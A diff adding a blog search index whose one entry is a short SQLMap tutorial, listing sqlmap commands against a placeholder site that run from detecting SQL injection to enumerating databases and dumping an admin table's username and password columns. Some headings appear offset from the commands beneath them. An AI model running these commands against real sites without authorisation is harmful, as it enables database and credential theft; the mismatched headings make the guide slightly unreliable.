@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>SQLMap usage tutorial</title>
+      <link href="/2023/11/29/sqlmap-usage-tutorial/"/>
+      <url>/2023/11/29/sqlmap-usage-tutorial/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.xxx.com/post.php?id=1&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Specify-the-database-type-as-mysql-level-3-a-total-of-5-levels-the-higher-the-level-the-more-comprehensive-the-detection"><a href="#Specify-the-database-type-as-mysql-level-3-a-total-of-5-levels-the-higher-the-level-the-more-comprehensive-the-detection" class="headerlink" title="Specify the database type as mysql, level 3 (a total of 5 levels, the higher the level, the more comprehensive the detection)"></a>Specify the database type as mysql, level 3 (a total of 5 levels, the higher the level, the more comprehensive the detection)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.xxx.com/post.php?id=1&quot;</span>  --dbms mysql --level 3</span><br></pre></td></tr></table></figure><h3 id="Cookie-injection"><a href="#Cookie-injection" class="headerlink" title="Cookie injection"></a>Cookie injection</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.xxx.com/post.php?id=1&quot;</span> --cookie <span class="string">&quot;id=11&quot;</span> --level 2</span><br></pre></td></tr></table></figure><h3 id="Inject-from-post-packet"><a href="#Inject-from-post-packet" class="headerlink" title="Inject from post packet"></a>Inject from post packet</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;request.txt&quot;</span> -p <span class="string">&quot;username&quot;</span> --dbms mysql</span><br></pre></td></tr></table></figure><h3 id="Get-basic-information-about-the-database"><a href="#Get-basic-information-about-the-database" class="headerlink" title="Get basic information about the database"></a>Get basic information about the database</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.xxx.com/post.php?id=1&quot;</span>  --dbms mysql --level 3 --dbs</span><br></pre></td></tr></table></figure><h3 id="Query-which-databases-are-available"><a href="#Query-which-databases-are-available" class="headerlink" title="Query which databases are available"></a>Query which databases are available</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.xxx.com/post.php?id=1&quot;</span>  --dbms mysql --level 3 -D <span class="built_in">test</span> --tables</span><br></pre></td></tr></table></figure><h3 id="Query-which-tables-are-in-the-test-database"><a href="#Query-which-tables-are-in-the-test-database" class="headerlink" title="Query which tables are in the test database"></a>Query which tables are in the test database</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.xxx.com/post.php?id=1&quot;</span>  --dbms mysql --level 3 -D <span class="built_in">test</span> -T admin --columns</span><br></pre></td></tr></table></figure><h3 id="Query-what-fields-are-in-the-admin-table-in-the-test-database"><a href="#Query-what-fields-are-in-the-admin-table-in-the-test-database" class="headerlink" title="Query what fields are in the admin table in the test database"></a>Query what fields are in the admin table in the test database</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.xxx.com/post.php?id=1&quot;</span>  --dbms mysql --level 3 -D <span class="built_in">test</span> -T admin -C <span class="string">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pentest </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Tools </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
